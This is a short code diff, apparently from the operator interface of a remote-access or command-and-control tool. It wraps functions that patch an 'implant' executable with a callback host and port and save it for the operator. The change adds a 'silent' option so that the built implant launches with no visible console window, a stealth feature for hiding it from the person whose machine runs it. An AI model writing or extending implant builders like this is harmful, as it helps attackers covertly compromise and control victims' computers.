@@ -126,15 +126,16 @@ export async function DeleteListener(id: string): Promise<void> {
 
 // ---- Stub builder ----
 
-export async function BuildStub(host: string, port: string): Promise<string> {
-  return app().BuildStub(host, port) // returns base64 exe bytes
+// silent selects the GUI-subsystem base exe (no console window on launch).
+export async function BuildStub(host: string, port: string, silent = false): Promise<string> {
+  return app().BuildStub(host, port, silent) // returns base64 exe bytes
 }
 
 // BuildStubToProject patches the implant exe via the core, then pops the OS
 // "Save As" dialog so the operator picks where to save it. Returns {path} —
 // path is "" if the operator cancelled. No browser blob download.
-export async function BuildStubToProject(host: string, port: string, name: string): Promise<{ path: string }> {
-  const s = await app().BuildStubToProject(host, port, name)
+export async function BuildStubToProject(host: string, port: string, name: string, silent = false): Promise<{ path: string }> {
+  const s = await app().BuildStubToProject(host, port, name, silent)
   return JSON.parse(s)
 }
 
